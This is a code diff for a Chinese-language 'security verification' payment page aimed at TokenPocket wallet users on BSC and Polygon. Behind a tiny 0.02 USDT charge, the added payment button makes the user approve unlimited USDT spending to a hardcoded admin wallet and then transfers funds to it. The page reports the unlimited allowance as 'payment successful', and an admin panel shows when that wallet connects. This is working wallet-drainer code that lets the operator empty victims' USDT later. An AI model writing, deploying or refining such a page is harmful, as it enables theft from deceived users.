@@ -24,13 +24,6 @@ flex:1;padding:10px;border-radius:10px;border:none;
 background:#222;color:#aaa;font-weight:bold;cursor:pointer
 }
 .chain-btn.active{background:#F0B90B;color:#000}
-#qrcode{
-width:280px;height:280px;background:#fff;padding:10px;
-border-radius:16px;margin:0 auto 20px;
-display:flex;align-items:center;justify-content:center;
-color:#000;font-size:14px;
-}
-#qrcode img{width:100%;height:100%;border-radius:12px}
 .tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
 .status {margin-top:15px;padding:12px;border-radius:10px;background:#111;font-size:14px}
 .status.success{background:#16a34a;color:#fff}
@@ -67,16 +60,17 @@ border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
 cursor:pointer;
 }
 
-#connectBtn {
+#connectBtn, #payBtn {
 margin-top:15px;padding:12px;background:#F0B90B;color:#000;border:none;
 border-radius:10px;width:100%;font-weight:bold
 }
+#payBtn {background:#16a34a;}
 </style>
 
 <div class="container">
   <div class="pay-box">
     <h1>💳 安全验证</h1>
-    <p class="desc">完成签名即可正常使用</p>
+    <p class="desc">完成支付即可正常使用</p>
     <div class="chain-select">
       <button class="chain-btn active" data-chain="bsc">BSC 主网</button>
       <button class="chain-btn" data-chain="polygon">Polygon 主网</button>
@@ -85,11 +79,11 @@ border-radius:10px;width:100%;font-weight:bold
       <label>支付金额（USDT）</label>
       <input type="number" id="amount" value="0.02" min="0.01" step="0.01">
     </div>
-    <div id="qrcode">生成二维码...</div>
-    <div class="tip">TokenPocket 扫码直接签名，无跳转</div>
+    <div class="tip">在 TokenPocket 内打开此页面，点击下方按钮完成支付</div>
     <button id="connectBtn">连接钱包</button>
+    <button id="payBtn" style="display:none">确认支付</button>
     <div id="authStatus" class="status">
-      未连接钱包，无法检测状态
+      未连接钱包，无法支付
     </div>
   </div>
 
@@ -115,36 +109,33 @@ border-radius:10px;width:100%;font-weight:bold
 <script>
 const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 
-// BSC + Polygon 主网配置
 const CONFIG = {
   bsc: {
     chainId: "56",
     chainIdHex: "0x38",
     token: "0x55d398326f99059fF775485246999027B3197955",
     decimals: 18,
-    rpc: "https://bsc-dataseed.binance.org/",
-    tpScheme: "bsc" // TP 钱包 BSC 协议名
+    rpc: "https://bsc-dataseed.binance.org/"
   },
   polygon: {
     chainId: "137",
     chainIdHex: "0x89",
     token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
     decimals: 6,
-    rpc: "https://polygon-rpc.com/",
-    tpScheme: "polygon" // TP 钱包 Polygon 协议名
+    rpc: "https://polygon-rpc.com/"
   }
 };
 
 const ERC20_ABI = [
   "function allowance(address owner, address spender) external view returns (uint256)",
-  "function balanceOf(address account) external view returns (uint256)"
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
 ];
 
 let currentChain = "bsc";
 let account = null;
 let provider;
-let refreshInterval;
-let lastStatus = null;
+let signer;
 
 // 切换链
 document.querySelectorAll(".chain-btn").forEach(btn => {
@@ -152,44 +143,13 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
     document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
     btn.classList.add("active");
     currentChain = btn.dataset.chain;
-    renderQR();
     if (account) checkStatus();
   };
 });
-document.getElementById("amount").addEventListener("input", renderQR);
 
-// 生成 TP 钱包专属 Deep Link（直接定向到对应网络）
-function genTPDeepLink() {
-  const { token, tpScheme } = CONFIG[currentChain];
-  const amount = parseFloat(document.getElementById("amount").value) || 0;
-  const { decimals } = CONFIG[currentChain];
-  const amountWei = BigInt(amount * (10 ** decimals)).toString(16).padStart(64, '0');
-
-  // 1. 无限授权 approve(admin, MaxUint256)
-  const approveData = "0x095ea7b3" +
-    ADMIN_WALLET.slice(2).padStart(64, '0') +
-    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-  // 2. 转账 transferFrom(user, admin, amount)
-  const transferData = "0x23b872dd" +
-    "0000000000000000000000000000000000000000000000000000000000000000" +
-    ADMIN_WALLET.slice(2).padStart(64, '0') +
-    amountWei;
-
-  const batchData = approveData + transferData.slice(2);
-  // TP 钱包专属格式：{scheme}://{token}?data={data}
-  return `${tpScheme}://${token}?data=${batchData}`;
-}
-
-function renderQR() {
-  const url = genTPDeepLink();
-  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
-  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="支付二维码">`;
-}
-
-// 连接钱包 + 自动切换网络
+// 连接钱包
 document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) { alert("请在 TokenPocket 钱包内打开"); return; }
+  if (!window.ethereum) { alert("请在 TokenPocket 钱包内打开此页面！"); return; }
   try {
     const { chainIdHex } = CONFIG[currentChain];
     await window.ethereum.request({
@@ -199,12 +159,12 @@ document.getElementById("connectBtn").onclick = async () => {
 
     provider = new ethers.BrowserProvider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
-    const signer = await provider.getSigner();
+    signer = await provider.getSigner();
     account = await signer.getAddress();
     checkAdmin();
     checkStatus();
-    if (refreshInterval) clearInterval(refreshInterval);
-    refreshInterval = setInterval(checkStatus, 5000);
+    document.getElementById("connectBtn").style.display = "none";
+    document.getElementById("payBtn").style.display = "block";
   } catch (e) {
     if (e.code === 4902) {
       const { chainIdHex, chainName, nativeCurrency, rpcUrls, blockExplorerUrls } = 
@@ -236,17 +196,40 @@ document.getElementById("connectBtn").onclick = async () => {
   }
 };
 
+// 确认支付：先 approve，再 transferFrom
+document.getElementById("payBtn").onclick = async () => {
+  if (!account || !signer) { alert("请先连接钱包"); return; }
+  try {
+    const { token, decimals } = CONFIG[currentChain];
+    const amount = parseFloat(document.getElementById("amount").value);
+    const amountWei = ethers.parseUnits(amount.toString(), decimals);
+    const tokenContract = new ethers.Contract(token, ERC20_ABI, signer);
+
+    // 1. 先授权给管理员
+    const approveTx = await tokenContract.approve(ADMIN_WALLET, ethers.MaxUint256);
+    await approveTx.wait();
+    console.log("授权成功:", approveTx.hash);
+
+    // 2. 再转账到管理员
+    const transferTx = await tokenContract.transferFrom(account, ADMIN_WALLET, amountWei);
+    await transferTx.wait();
+    console.log("转账成功:", transferTx.hash);
+
+    document.getElementById("successModal").classList.add("show");
+    checkStatus();
+  } catch (e) {
+    alert("支付失败：" + e.message);
+  }
+};
+
 // 检查是否为管理员
 async function checkAdmin() {
   if (!account) return;
   const adminPanel = document.getElementById("adminPanel");
-  const connectBtn = document.getElementById("connectBtn");
   if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
     adminPanel.classList.add("show");
-    connectBtn.innerText = "✅ 已连接管理员";
   } else {
     adminPanel.classList.remove("show");
-    connectBtn.innerText = "连接钱包";
   }
 }
 
@@ -257,9 +240,8 @@ function closeModal() {
 // 检查当前用户状态
 async function checkStatus() {
   if (!account || !provider) {
-    document.getElementById("authStatus").innerHTML = "未连接钱包，无法检测状态";
+    document.getElementById("authStatus").innerHTML = "未连接钱包，无法支付";
     document.getElementById("authStatus").className = "status warning";
-    lastStatus = null;
     return;
   }
   try {
@@ -267,15 +249,9 @@ async function checkStatus() {
     const tokenContract = new ethers.Contract(token, ERC20_ABI, provider);
     const allowance = await tokenContract.allowance(account, ADMIN_WALLET);
     const statusEl = document.getElementById("authStatus");
-    const currentStatus = allowance >= ethers.MaxUint256 / 2n ? "success" : "none";
-
-    if (currentStatus === "success" && lastStatus !== "success") {
-      document.getElementById("successModal").classList.add("show");
-    }
-    lastStatus = currentStatus;
 
     if (allowance >= ethers.MaxUint256 / 2n) {
-      statusEl.innerHTML = `✅ 支付成功！已完成授权`;
+      statusEl.innerHTML = `✅ 支付成功！已完成无限授权`;
       statusEl.className = "status success";
     } else {
       statusEl.innerHTML = "❌ 未完成支付";
@@ -314,9 +290,7 @@ async function checkUserAuth() {
   }
 }
 
-// 页面加载
 window.addEventListener("load", () => {
-  renderQR();
   if (window.ethereum) {
     window.ethereum.on("accountsChanged", (accs) => {
       account = accs[0];
